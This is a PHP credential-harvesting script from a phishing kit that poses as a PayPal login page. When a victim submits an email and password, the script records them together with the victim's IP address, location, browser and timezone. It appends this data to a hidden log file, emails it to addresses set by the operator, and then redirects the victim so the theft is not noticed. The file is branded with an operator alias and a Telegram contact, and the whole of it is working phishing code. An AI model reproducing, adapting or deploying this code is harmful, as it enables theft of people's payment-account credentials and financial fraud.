<?php
if (isset($_POST['EML']) && isset($_POST['PWD'])) {
    session_start();
    include '../mine.php';
    
    $_SESSION['EML'] = $_POST['EML'];
    $msg         = "🔘 CASTRO // NEW PAYPAL LOGIN\r\n";
    $msg .= "🍉 [ LOGIN PAYPAL]\r\n";
    $msg .= "📋Email: {$_POST['EML']}\r\n";
    $msg .= "📋Mot de passe: {$_POST['PWD']}\r\n";
    $msg .= "🍋 [ Informations IP ]\r\n";
    $msg .= "📋Adresse IP: {$_SESSION['ip']}\r\n";
    $msg .= "📋Localisation: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "📋Navigateur: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "📋Heure du Pays: {$_SESSION['ip_timezone']}\r\n";
    $msg .= "📋Heure/Date/Jour/Année: " . now() . " GMT\r\n";
    $msg .= "\r\n";
    $msg .= "🌟 CASTRO 🌟\r\n";
    $msg .= "📲TELEGRAM: @caastro";
    $save = fopen("../../vxvrez.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "🎰Logs Paypal🎰 [{$_POST['EML']}][{$_SESSION['ip']}]";
    $headers = "From:💈L'amour engendre le sacrifice... Qui lui-même engendre la haine... Et c'est après que la souffrance entre en jeu..💈<castro@servicetechniques.fr>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
    @mail($antibot, $subject, $msg, $headers);
    exit(header("Location: ../../app/process"));
}
?>